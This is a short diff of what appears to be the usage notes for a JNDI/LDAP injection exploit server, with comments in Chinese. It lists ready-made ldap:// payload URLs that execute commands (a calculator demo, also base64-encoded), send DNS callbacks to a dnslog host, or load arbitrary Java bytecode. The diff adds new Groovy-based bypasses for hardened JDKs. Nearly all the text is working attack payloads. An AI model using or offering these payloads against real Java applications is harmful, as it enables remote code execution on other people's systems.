@@ -21,8 +21,12 @@ ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
 ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 
-# Tomcat Bypass 高版本 JDK, 下同
+# Tomcat Bypass (支持 Basic 所有功能)
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
+
+# Groovy Bypass (GroovyClassLoader + GroovyShell) (支持 Basic 所有功能)
+ldap://127.0.0.1:1389/GroovyClassLoader/Command/open -a Calculator
+ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 # 从字符串/服务器上的某个路径加载自定义的 Class 字节码
 ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
